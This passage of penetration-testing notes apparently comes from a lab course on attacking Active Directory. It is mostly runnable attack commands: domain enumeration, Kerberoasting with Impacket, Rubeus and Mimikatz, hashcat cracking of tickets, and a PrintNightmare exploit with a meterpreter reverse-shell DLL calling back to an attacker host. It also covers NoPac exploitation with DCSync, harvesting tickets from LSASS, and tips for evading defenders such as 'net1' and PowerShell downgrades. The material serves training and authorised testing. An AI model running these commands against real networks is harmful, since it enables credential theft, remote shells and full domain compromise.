$ python3 windapsearch.py --dc-ip &lt;DC_IP&gt; -u &lt;USERNAME&gt;@&lt;DOMAIN&gt; -p &lt;PASSWORD&gt; --da

## Privileged Users
$ python3 windapsearch.py --dc-ip &lt;DC_IP&gt; -u &lt;USERNAME&gt;@&lt;DOMAIN&gt; -p &lt;PASSWORD&gt; -PU
</code></pre>
<h3 id="bloodhoundpy-httpsgithubcomfox-itbloodhoundpy">Bloodhound.py [https://github.com/fox-it/BloodHound.py]</h3>
<p>Once we have domain credentials, we can run the BloodHound.py BloodHound ingestor from our Linux attack host. BloodHound is one of, if not the most impactful tools ever released for auditing Active Directory security, and it is hugely beneficial for us as penetration testers. We can take large amounts of data that would be time-consuming to sift through and create graphical representations or "attack paths" of where access with a particular user may lead. We will often find nuanced flaws in an AD environment that would have been missed without the ability to run queries with the BloodHound GUI tool and visualize issues. The tool uses graph theory to visually represent relationships and uncover attack paths that would have been difficult, or even impossible to detect with other tools. The tool consists of two parts: the SharpHound collector written in C# for use on Windows systems, or for this section, the BloodHound.py collector (also referred to as an ingestor) and the BloodHound GUI tool which allows us to upload collected data in the form of JSON files. Once uploaded, we can run various pre-built queries or write custom queries using Cypher language. The tool collects data from AD such as users, groups, computers, group membership, GPOs, ACLs, domain trusts, local admin access, user sessions, computer and user properties, RDP access, WinRM access, etc.</p>
<pre><code class="language-bash">$ sudo bloodhound-python -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -ns &lt;DC_IP&gt; -d inlanefreight.local -c all 

# Upload the Zip File into the BloodHound GUI**
$ sudo neo4j start (kali:neo4j, neo4j:kali)
$ zip -r ilfreight_bh.zip *.json

$ bloodhound 
</code></pre>
<h3 id="activedirectory-powershell-module">ActiveDirectory PowerShell Module</h3>
<pre><code class="language-powershell">PS &gt; Get-Module

# Load ActiveDirectory Module
PS &gt; Import-Module ActiveDirectory

# Group Enumeration
PS &gt; Get-ADGroup -Filter * | select name

# Detailed Group Info
PS &gt; Get-ADGroup -Identity &quot;Backup Operators&quot;

# Group Membership
PS &gt; Get-ADGroupMember -Identity &quot;Backup Operators&quot;
</code></pre>
<h3 id="powerview-httpsgithubcompowershellmafiapowersploitblobmasterreconpowerviewps1">PowerView [https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1]</h3>
<pre><code class="language-bash"># Domain User Information
PS &gt; Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

# Recursive Group Membership
PS &gt;  Get-DomainGroupMember -Identity &quot;Domain Admins&quot; -Recurse

# We can use the Test-AdminAccess function to test for local admin access on either the current machine or a remote one.
## Testing for Local Admin Access
PS &gt; Test-AdminAccess -ComputerName ACADEMY-EA-MS01

# Finding Users With SPN Set (kerberostables)
PS &gt; Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
</code></pre>
<h3 id="sharpview-httpsgithubcomdmchellsharpview">SharpView [https://github.com/dmchell/SharpView]</h3>
<pre><code class="language-powershell">PS &gt; .\SharpView.exe Get-DomainUser -Identity forend
</code></pre>
<h3 id="snaffler-httpsgithubcomsnaffconsnaffler">Snaffler [https://github.com/SnaffCon/Snaffler]</h3>
<p>Snaffler is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment. Snaffler works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories. Once that is done, it iterates through any directories readable by our user and hunts for files that could serve to better our position within the assessment. Snaffler requires that it be run from a domain-joined host or in a domain-user context.</p>
<pre><code class="language-powershell">PS &gt; .\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data
</code></pre>
<h3 id="bloodhound-httpsgithubcombloodhoundadbloodhound">BloodHound [https://github.com/BloodHoundAD/BloodHound]</h3>
<h4 id="sharphound-httpsgithubcombloodhoundadbloodhoundtreemastercollectors">SharpHound [https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors]</h4>
<pre><code class="language-powershell">PS &gt; .\SharpHound.exe -c All --zipfilename ILFREIGHT
PS &gt; .\SharpHound.exe -c All --zipfilename ILFREIGHT --ldapusername AB920 --ldappassword weasal
</code></pre>
<h3 id="living-off-the-land">Living Off the Land</h3>
<pre><code class="language-powershell"># Quick Checks Using PowerShell
whoami /groups

PS &gt; Get-Module
PS &gt; Get-ExecutionPolicy -List
PS &gt; Get-ChildItem Env: | ft key,value


# Downgrade Powershell
PS &gt; Get-host
PS &gt; powershell.exe -version 2
PS &gt; Get-host
PS &gt; get-module

# Firewall Checks
PS &gt; netsh advfirewall show allprofiles


# Windows Defender Check (from CMD.exe)
&gt; sc query windefend

# Get-MpComputerStatus
PS &gt; Get-MpComputerStatus

# Am I Alone?
'
When landing on a host for the first time, one important thing is to check and see if you are the only one logged in. If you start taking actions from a host someone else is on, there is the potential for them to notice you. If a popup window launches or a user is logged out of their session, they may report these actions or change their password, and we could lose our foothold.
'

# Using qwinsta
PS &gt; qwinsta
</code></pre>
<h4 id="network-information">Network Information</h4>
<table>
<thead>
<tr>
<th>Networking Commands</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>arp -a Lists all</td>
<td>known hosts stored in the arp table.</td>
</tr>
<tr>
<td>ipconfig /all</td>
<td>Prints out adapter settings for the host. We can figure out the network segment from here.</td>
</tr>
<tr>
<td>route print</td>
<td>Displays the routing table (IPv4 &amp; IPv6) identifying known networks and layer three routes shared with the host.</td>
</tr>
<tr>
<td>netsh advfirewall show state</td>
<td>Displays the status of the host's firewall. We can determine if it is active and filtering traffic.</td>
</tr>
</tbody>
</table>
<pre><code class="language-bash"># Using arp -a
PS &gt; arp -a

# Viewing the Routing Table
PS &gt; route print

'
Using arp -a and route print will not only benefit in enumerating AD environments, but will also assist us in identifying opportunities to pivot to different network segments in any environment. These are commands we should consider using on each engagement to assist our clients in understanding where an attacker may attempt to go following initial compromise.
'
</code></pre>
<h4 id="windows-management-instrumentation-wmi">Windows Management Instrumentation (WMI)</h4>
<h5 id="quick-wmi-checks">Quick WMI checks</h5>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>wmic qfe get Caption,Description,HotFixID,InstalledOn  Prints the patch level and description of the Hotfixes applied</td>
<td></td>
</tr>
<tr>
<td>wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List Displays basic host information to include any attributes within the list</td>
<td></td>
</tr>
<tr>
<td>wmic process list /format:list A listing of all processes on host</td>
<td></td>
</tr>
<tr>
<td>wmic ntdomain list /format:list    Displays information about the Domain and Domain Controllers</td>
<td></td>
</tr>
<tr>
<td>wmic useraccount list /format:list Displays information about all local accounts and any domain accounts that have logged into the device</td>
<td></td>
</tr>
<tr>
<td>wmic group list /format:list   Information about all local groups</td>
<td></td>
</tr>
<tr>
<td>wmic sysaccount list /format:list  Dumps information about any system accounts that are being used as service accounts.</td>
<td></td>
</tr>
</tbody>
</table>
<h4 id="net-commands">Net Commands</h4>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>net accounts</td>
<td>Information about password requirements</td>
</tr>
<tr>
<td>net accounts /domain</td>
<td>Password and lockout policy</td>
</tr>
<tr>
<td>net group /domain</td>
<td>Information about domain groups</td>
</tr>
<tr>
<td>net group "Domain Admins" /domain</td>
<td>List users with domain admin privileges</td>
</tr>
<tr>
<td>net group "domain computers" /domain</td>
<td>List of PCs connected to the domain</td>
</tr>
<tr>
<td>net group "Domain Controllers" /domain</td>
<td>List PC accounts of domains controllers</td>
</tr>
<tr>
<td>net group <domain_group_name> /domain</td>
<td>User that belongs to the group</td>
</tr>
<tr>
<td>net groups /domain</td>
<td>List of domain groups</td>
</tr>
<tr>
<td>net localgroup</td>
<td>All available groups</td>
</tr>
<tr>
<td>net localgroup administrators /domain</td>
<td>List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)</td>
</tr>
<tr>
<td>net localgroup Administrators</td>
<td>Information about a group (admins)</td>
</tr>
<tr>
<td>net localgroup administrators [username] /add</td>
<td>Add user to administrators</td>
</tr>
<tr>
<td>net share</td>
<td>Check current shares</td>
</tr>
<tr>
<td>net user <ACCOUNT_NAME> /domain</td>
<td>Get information about a user within the domain</td>
</tr>
<tr>
<td>net user /domain</td>
<td>List all users of the domain</td>
</tr>
<tr>
<td>net user %username%</td>
<td>Information about the current user</td>
</tr>
<tr>
<td>net use x: \computer\share</td>
<td>Mount the share locally</td>
</tr>
<tr>
<td>net view</td>
<td>Get a list of computers</td>
</tr>
<tr>
<td>net view /all /domain[:domainname]</td>
<td>Shares on the domains</td>
</tr>
<tr>
<td>net view \computer /ALL</td>
<td>List shares of a computer</td>
</tr>
<tr>
<td>net view /domain</td>
<td>List of PCs of the domain</td>
</tr>
</tbody>
</table>
<h5 id="net-commands-trick">Net Commands Trick</h5>
<p>If you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing net1 instead of net will execute the same functions without the potential trigger from the net string.</p>
<h4 id="dsquery">Dsquery</h4>
<pre><code class="language-powershell"># User Search
PS &gt; dsquery user

# Computer Search
PS &gt; dsquery computer

# Wildcard Search
PS &gt; dsquery * &quot;CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;

# Users With Specific Attributes Set (PASSWD_NOTREQD)
PS &gt; dsquery * -filter &quot;(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))&quot; -attr distinguishedName userAccountControl

# Searching for Domain Controllers
PS &gt; dsquery * -filter &quot;(userAccountControl:1.2.840.113556.1.4.803:=8192)&quot; -limit 5 -attr sAMAccountName
</code></pre>
<hr />
<h2 id="kerberoasting">Kerberoasting</h2>
<p>Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. This attack targets Service Principal Names (SPN) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running. Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as NT AUTHORITY\LOCAL SERVICE. Any domain user can request a Kerberos ticket for any service account in the same domain. This is also possible across forest trusts if authentication is permitted across the trust boundary. All you need to perform a Kerberoasting attack is an account's cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host.</p>
<p>Domain accounts running services are often local administrators, if not highly privileged domain accounts. Due to the distributed nature of systems, interacting services, and associated data transfers, service accounts may be granted administrator privileges on multiple servers across the enterprise. Many services require elevated privileges on various systems, so service accounts are often added to privileged groups, such as Domain Admins, either directly or via nested membership. Finding SPNs associated with highly privileged accounts in a Windows environment is very common. Retrieving a Kerberos ticket for an account with an SPN does not by itself allow you to execute commands in the context of this account. However, the ticket (TGS-REP) is encrypted with the service account’s NTLM hash, so the cleartext password can potentially be obtained by subjecting it to an offline brute-force attack with a tool such as Hashcat.</p>
<p>Service accounts are often configured with weak or reused password to simplify administration, and sometimes the password is the same as the username. If the password for a domain SQL Server service account is cracked, you are likely to find yourself as a local admin on multiple servers, if not Domain Admin. Even if cracking a ticket obtained via a Kerberoasting attack gives a low-privilege user account, we can use it to craft service tickets for the service specified in the SPN. For example, if the SPN is set to MSSQL/SRV01, we can access the MSSQL service as sysadmin, enable the xp_cmdshell extended procedure and gain code execution on the target SQL server.</p>
<h3 id="linux_2">Linux</h3>
<h4 id="kerberoasting-performing-the-attack">Kerberoasting - Performing the Attack</h4>
<p>Depending on your position in a network, this attack can be performed in multiple ways:</p>
<ul>
<li>From a non-domain joined Linux host using valid domain user credentials.</li>
<li>From a domain-joined Linux host as root after retrieving the keytab file.</li>
<li>From a domain-joined Windows host authenticated as a domain user.</li>
<li>From a domain-joined Windows host with a shell in the context of a domain account.</li>
<li>As SYSTEM on a domain-joined Windows host.</li>
<li>From a non-domain joined Windows host using runas /netonly.</li>
</ul>
<p>Several tools can be utilized to perform the attack:</p>
<ul>
<li>Impacket’s GetUserSPNs.py [https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py] from a non-domain joined Linux host.</li>
<li>A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.</li>
<li>From Windows, utilizing tools such as PowerView[https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1], Rubeus[https://github.com/GhostPack/Rubeus], and other PowerShell scripts.</li>
</ul>
<p>Obtaining a TGS ticket via Kerberoasting does not guarantee you a set of valid credentials, and the ticket must still be cracked offline with a tool such as Hashcat to obtain the cleartext password. TGS tickets take longer to crack than other formats such as NTLM hashes, so often, unless a weak password is set, it can be difficult or impossible to obtain the cleartext using a standard cracking rig.</p>
<h4 id="kerberoasting-with-getuserspnspy">Kerberoasting with GetUserSPNs.py</h4>
<p><code>A prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it.</code></p>
<p>We can start by just gathering a listing of SPNs in the domain. To do this, we will need a set of valid domain credentials and the IP address of a Domain Controller. We can authenticate to the Domain Controller with a cleartext password, NT password hash, or even a Kerberos ticket. For our purposes, we will use a password. Entering the below command will generate a credential prompt and then a nicely formatted listing of all SPN accounts. From the output below, we can see that several accounts are members of the Domain Admins group. If we can retrieve and crack one of these tickets, it could lead to domain compromise. It is always worth investigating the group membership of all accounts because we may find an account with an easy-to-crack ticket that can help us further our goal of moving laterally/vertically in the target domain.</p>
<pre><code class="language-bash"># Listing SPN Accounts with GetUserSPNs.py
$ GetUserSPNs.py -dc-ip &lt;DC_IP&gt; &lt;DOMAIN.FULL&gt;/&lt;USERNAME&gt;

&quot;&quot;&quot;
We can now pull all TGS tickets for offline processing using the -request flag. The TGS tickets will be output in a format that can be readily provided to Hashcat or John the Ripper for offline password cracking attempts.
&quot;&quot;&quot;
# Requesting all TGS Tickets
$ GetUserSPNs.py -dc-ip &lt;DC_IP&gt; &lt;DOMAIN.FULL&gt;/&lt;USERNAME&gt; -request

&quot;&quot;&quot;
We can also be more targeted and request just the TGS ticket for a specific account. Let's try requesting one for just the sqldev account.
&quot;&quot;&quot;
# Requesting a Single TGS ticket
$ GetUserSPNs.py -dc-ip &lt;DC_IP&gt; &lt;DOMAIN.FULL&gt;/&lt;USERNAME&gt; -request-user &lt;DC_USER&gt;

# Saving the TGS Ticket to an Output File
$ GetUserSPNs.py -dc-ip &lt;DC_IP&gt; &lt;DOMAIN.FULL&gt;/&lt;USERNAME&gt; -request-user &lt;DC_USER&gt; -outputfile &lt;FILENAME&gt;
</code></pre>
<h3 id="windows_2">Windows</h3>
<h4 id="kerberoasting-semi-manual-method">Kerberoasting - Semi Manual method</h4>
<h5 id="enumerating-spns-with-setspnexe">Enumerating SPNs with setspn.exe</h5>
<pre><code>&gt; setspn.exe -Q */*
</code></pre>
<p><strong>Targeting a Single User</strong></p>
<pre><code>&gt; Add-Type -AssemblyName System.IdentityModel
&gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433&quot;
</code></pre>
<p><strong>Retrieving All Tickets Using setspn.exe</strong></p>
<pre><code>PS &gt; setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
</code></pre>
<h5 id="extracting-tickets-from-memory-with-mimikatz">Extracting Tickets from Memory with Mimikatz</h5>
<pre><code>mimikatz # base64 /out:true
mimikatz # kerberos::list /export  

</code></pre>
<p><strong>Preparing the Base64 Blob for Cracking</strong></p>
<pre><code>$ echo &quot;&lt;base64 blob&gt;&quot; |  tr -d \\n 
</code></pre>
<p><strong>Placing the Output into a File as .kirbi</strong></p>
<pre><code>$ cat encoded_file | base64 -d &gt; sqldev.kirbi
</code></pre>
<p><strong>Extracting the Kerberos Ticket using kirbi2john.py</strong></p>
<pre><code>$ python2.7 kirbi2john.py sqldev.kirbi
</code></pre>
<p><strong>Modifiying crack_file for Hashcat</strong></p>
<pre><code>$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file &gt; sqldev_tgs_hashcat
</code></pre>
<h4 id="using-powerview-to-extract-tgs-tickets-httpsrawgithubusercontentcompowershellmafiapowersploitmasterreconpowerviewps1">Using PowerView to Extract TGS Tickets [https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1]</h4>
<pre><code class="language-powershell">PS &gt; Import-Module .\PowerView.ps1

# Get Kerberoastable acconts
PS &gt; Get-DomainUser * -spn | select samaccountname

# Using PowerView to Target a Specific User
PS &gt; Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

# Exporting All Tickets to a CSV File
PS &gt; Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation

# Viewing the Contents of the .CSV File
PS &gt; cat .\ilfreight_tgs.csv
</code></pre>
<p>We can also use Rubeus from GhostPack to perform Kerberoasting even faster and easier. Rubeus provides us with a variety of options for performing Kerberoasting.</p>
<h4 id="using-rubeus-httpsgithubcomghostpackrubeus">Using Rubeus [https://github.com/GhostPack/Rubeus]</h4>
<pre><code class="language-powershell">PS &gt; .\Rubeus.exe

# Using the /stats Flag
PS &gt; .\Rubeus.exe kerberoast /stats

&quot;&quot;&quot;
If we saw any SPN accounts with their passwords set 5 or more years ago, they could be promising targets as they could have a weak password that was set and never changed when the organization was less mature.
&quot;&quot;&quot;

# Using the /nowrap Flag
PS &gt; .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
PS &gt; .\Rubeus.exe kerberoast /nowrap

# Exporting to file
PS &gt; .\Rubeus.exe kerberoast /outfile:out.txt
</code></pre>
<h3 id="cracking-the-ticket-offline-with-hashcat">Cracking the Ticket Offline with Hashcat</h3>
<h4 id="a-note-on-encryption-types">A Note on Encryption Types</h4>
<p><code>The below examples on encryption types are not reproducible in the module lab because the target Domain Controller is running Windows Server 2019. More on that later in the section.</code></p>
<p>Kerberoasting tools typically request RC4 encryption when performing the attack and initiating TGS-REQ requests. This is because RC4 is weaker and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256. When performing Kerberoasting in most environments, we will retrieve hashes that begin with $krb5tgs$23$<em>, an RC4 (type 23) encrypted ticket. Sometimes we will receive an AES-256 (type 18) encrypted hash or hash that begins with $krb5tgs$18$</em>. While it is possible to crack AES-128 (type 17) and AES-256 (type 18) TGS tickets using Hashcat, it will typically be significantly more time consuming than cracking an RC4 (type 23) encrypted ticket, but still possible especially if a weak password is chosen.</p>
<pre><code>PS &gt; .\Rubeus.exe kerberoast /user:testspn /nowrap
</code></pre>
<pre><code>PS &gt; Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
</code></pre>
<p>Checking with PowerView, we can see that the msDS-SupportedEncryptionTypes attribute is set to 0. The chart here[https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797] tells us that a decimal value of 0 means that a specific encryption type is not defined and set to the default of RC4_HMAC_MD5.</p>
<h6 id="cracking-the-ticket-with-hashcat-rockyoutxt">Cracking the Ticket with Hashcat &amp; rockyou.txt</h6>
<pre><code>$ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 
</code></pre>
<p>If we check this with PowerView, we'll see that the msDS-SupportedEncryptionTypes attribute is set to 24, meaning that AES 128/256 encryption types are the only ones supported.</p>
<h6 id="running-hashcat">Running Hashcat</h6>
<pre><code>$ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
</code></pre>
<h6 id="using-the-tgtdeleg-flag">Using the /tgtdeleg Flag</h6>
<p>We can use Rubeus with the /tgtdeleg flag to specify that we want only RC4 encryption when requesting a new service ticket. The tool does this by specifying RC4 encryption as the only algorithm we support in the body of the TGS request. This may be a failsafe built-in to Active Directory for backward compatibility. By using this flag, we can request an RC4 (type 23) encrypted ticket that can be cracked much faster.</p>
<p><code>Note: This does not work against a Windows Server 2019 Domain Controller, regardless of the domain functional level. It will always return a service ticket encrypted with the highest level of encryption supported by the target account. This being said, if we find ourselves in a domain with Domain Controllers running on Server 2016 or earlier (which is quite common), enabling AES will not partially mitigate Kerberoasting by only returning AES encrypted tickets, which are much more difficult to crack, but rather will allow an attacker to request an RC4 encrypted service ticket. In Windows Server 2019 DCs, enabling AES encryption on an SPN account will result in us receiving an AES-256 (type 18) service ticket, which is substantially more difficult (but not impossible) to crack, especially if a relatively weak dictionary password is in use.</code></p>
<hr />
<h2 id="vulnerabilities">Vulnerabilities</h2>
<h3 id="printnightmare">PrintNightmare</h3>
<p>PrintNightmare is the nickname given to two vulnerabilities (CVE-2021-34527 and CVE-2021-1675) found in the Print Spooler service that runs on all Windows operating systems. Many exploits have been written based on these vulnerabilities that allow for privilege escalation and remote code execution. Using this vulnerability for local privilege escalation is covered in the Windows Privilege Escalation module, but is also important to practice within the context of Active Directory environments for gaining remote access to a host. Let's practice with one exploit that can allow us to gain a SYSTEM shell session on a Domain Controller running on a Windows Server 2019 host.</p>
<p>We can use rpcdump.py to see if Print System Asynchronous Protocol and Print System Remote Protocol are exposed on the target.</p>
<h4 id="enumerating-for-ms-rprn">Enumerating for MS-RPRN</h4>
<pre><code class="language-bash">$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
</code></pre>
<h4 id="generating-a-dll-payload">Generating a DLL Payload</h4>
<pre><code class="language-bash">$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll &gt; backupscript.dll

$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp

$ sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
</code></pre>
<h3 id="nopac-samaccountname-spoofing">NoPac (SamAccountName Spoofing)</h3>
<p>This exploit path takes advantage of being able to change the SamAccountName of a computer account to that of a Domain Controller. By default, authenticated users can add up to ten computers to a domain. When doing so, we change the name of the new host to match a Domain Controller's SamAccountName. Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC's name instead of the new name. When a TGS is requested, it will issue the ticket with the closest matching name. Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller.</p>
<p>NoPac [https://github.com/Ridter/noPac] uses many tools in Impacket to communicate with, upload a payload, and issue commands from the attack host to the target DC. Before attempting to use the exploit, we should ensure Impacket is installed and the noPac [] exploit repo is cloned to our attack host if needed. We can use these commands to do so:</p>
<p>we can use the scripts in the NoPac directory to check if the system is vulnerable using a scanner (scanner.py) then use the exploit (noPac.py) to gain a shell as NT AUTHORITY/SYSTEM. We can use the scanner with a standard domain user account to attempt to obtain a TGT from the target Domain Controller. If successful, this indicates the system is, in fact, vulnerable. We'll also notice the ms-DS-MachineAccountQuota number is set to 10. In some environments, an astute sysadmin may set the ms-DS-MachineAccountQuota value to 0. If this is the case, the attack will fail because our user will not have the rights to add a new machine account. Setting this to 0 can prevent quite a few AD attacks.</p>
<pre><code class="language-bash"># Scanning for NoPac
$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

# Running NoPac &amp; Getting a Shell
$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
</code></pre>
<p>It is important to note that NoPac.py does save the TGT in the directory on the attack host where the exploit was run. We can use ls to confirm.</p>
<h4 id="using-nopac-to-dcsync-the-built-in-administrator-account">Using noPac to DCSync the Built-in Administrator Account</h4>
<pre><code class="language-bash">$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
</code></pre>
<h3 id="printer-bug">Printer Bug</h3>
<p>The Printer Bug is a flaw in the MS-RPRN protocol (Print System Remote Protocol). This protocol defines the communication of print job processing and print system management between a client and a print server. To leverage this flaw, any domain user can connect to the spool's named pipe with the RpcOpenPrinter method and use the RpcRemoteFindFirstPrinterChangeNotificationEx method, and force the server to authenticate to any host provided by the client over SMB.</p>
<p>The spooler service runs as SYSTEM and is installed by default in Windows servers running Desktop Experience. This attack can be leveraged to relay to LDAP and grant your attacker account DCSync privileges to retrieve all password hashes from AD.</p>
<p>The attack can also be used to relay LDAP authentication and grant Resource-Based Constrained Delegation (RBCD) privileges for the victim to a computer account under our control, thus giving the attacker privileges to authenticate as any user on the victim's computer. This attack can be leveraged to compromise a Domain Controller in a partner domain/forest, provided you have administrative access to a Domain Controller in the first forest/domain already, and the trust allows TGT delegation, which is not by default anymore.</p>
<p>We can use tools such as the Get-SpoolStatus module from this tool or [https://github.com/NotMedic/NetNTLMtoSilverTicket] this tool to check for machines vulnerable to the MS-PRN Printer Bug. This flaw can be used to compromise a host in another forest that has Unconstrained Delegation enabled, such as a domain controller. It can help us to attack across forest trusts once we have compromised one forest.</p>
<h3 id="privexchange">PrivExchange</h3>
<p>The PrivExchange attack results from a flaw in the Exchange Server PushSubscription feature, which allows any domain user with a mailbox to force the Exchange server to authenticate to any host provided by the client over HTTP.</p>
<p>The Exchange service runs as SYSTEM and is over-privileged by default (i.e., has WriteDacl privileges on the domain pre-2019 Cumulative Update). This flaw can be leveraged to relay to LDAP and dump the domain NTDS database. If we cannot relay to LDAP, this can be leveraged to relay and authenticate to other hosts within the domain. This attack will take you directly to Domain Admin with any authenticated domain user account.</p>
<h3 id="password-in-description-field">Password in Description Field</h3>
<p>Sensitive information such as account passwords are sometimes found in the user account Description or Notes fields and can be quickly enumerated using PowerView. For large domains, it is helpful to export this data to a CSV file to review offline.</p>
<h4 id="finding-passwords-in-the-description-field-using-get-domain-user">Finding Passwords in the Description Field using Get-Domain User</h4>
<pre><code>PS &gt; Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
</code></pre>
<h3 id="passwd_notreqd-field">PASSWD_NOTREQD Field</h3>
<p>It is possible to come across domain accounts with the passwd_notreqd field set in the userAccountControl attribute. If this is set, the user is not subject to the current password policy length, meaning they could have a shorter password or no password at all (if empty passwords are allowed in the domain). A password may be set as blank intentionally (sometimes admins don’t want to be called out of hours to reset user passwords) or accidentally hitting enter before entering a password when changing it via the command line. Just because this flag is set on an account, it doesn't mean that no password is set, just that one may not be required. There are many reasons why this flag may be set on a user account, one being that a vendor product set this flag on certain accounts at the time of installation and never removed the flag post-install. It is worth enumerating accounts with this flag set and testing each to see if no password is required (I have seen this a couple of times on assessments). Also, include it in the client report if the goal of the assessment is to be as comprehensive as possible.</p>
<h4 id="checking-for-passwd_notreqd-setting-using-get-domainuser">Checking for PASSWD_NOTREQD Setting using Get-DomainUser</h4>
<pre><code>PS &gt; Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
</code></pre>
<hr />
<h1 id="privilege-escalation">Privilege Escalation</h1>
<p>Check <a href="../../PrivilegeEscalation/Windows/">Windows Privilege Escalation</a>
- <a href="../../PrivilegeEscalation/Windows/#vulnerabilities">Vulnerabilities</a>
- <a href="../../PrivilegeEscalation/Windows/#credential-harvesting">Credential Harvesting</a></p>
<hr />
<h1 id="admin-access-on-machine">Admin Access on Machine</h1>
<p>Check <a href="../../PrivilegeEscalation/Windows/">Windows Privilege Escalation</a>
- <a href="../../PrivilegeEscalation/Windows/#passwords-attacks">Passwords Attacks</a>
- <a href="../../PrivilegeEscalation/Windows/#credential-harvesting">Credential Harvesting</a></p>
<h2 id="harvesting-kerberos-tickets-from-windows">Harvesting Kerberos Tickets from Windows</h2>
<p>We need a valid Kerberos ticket to perform a Pass the Ticket (PtT). It can be:</p>
<pre><code>- `Service Ticket (TGS - Ticket Granting Service) to allow access to a particular resource.`
- `Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.`
</code></pre>
<p>Before we perform a Pass the Ticket (PtT) attack, let's see some methods to get a ticket using Mimikatz [https://github.com/ParrotSec/mimikatz] and Rubeus [https://github.com/GhostPack/Rubeus].</p>
<p>On Windows, tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process. Therefore, to get a ticket from a Windows system, you must communicate with LSASS and request it. As a non-administrative user, you can only get your tickets, but as a local administrator, you can collect everything.</p>
<p>We can harvest all tickets from a system using the Mimikatz module sekurlsa::tickets /export. The result is a list of files with the extension .kirbi, which contain the tickets.</p>
<h3 id="mimikatz-export-tickets">Mimikatz - Export Tickets</h3>
<pre><code>&gt; mimikatz.exe
&gt; privilege::debug
&gt; sekurlsa::tickets /export
&gt; exit
&gt; dir *.kirbi
</code></pre>
<p>The tickets that end with $ correspond to the computer account, which needs a ticket to interact with the Active Directory. User tickets have the user's name, followed by an @ that separates the service name and the domain, for example: [randomvalue]-username@service-domain.local.kirbi.</p>
<blockquote>
<p>Note: If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account.</p>
</blockquote>
<pre><code>ren &quot;[0;38319]-2-0-40e10000-tpetty@krbtgt-INLANEFREIGHT.LOCAL.kirbi&quot; new.kirbi  
</code></pre>
<blockquote>
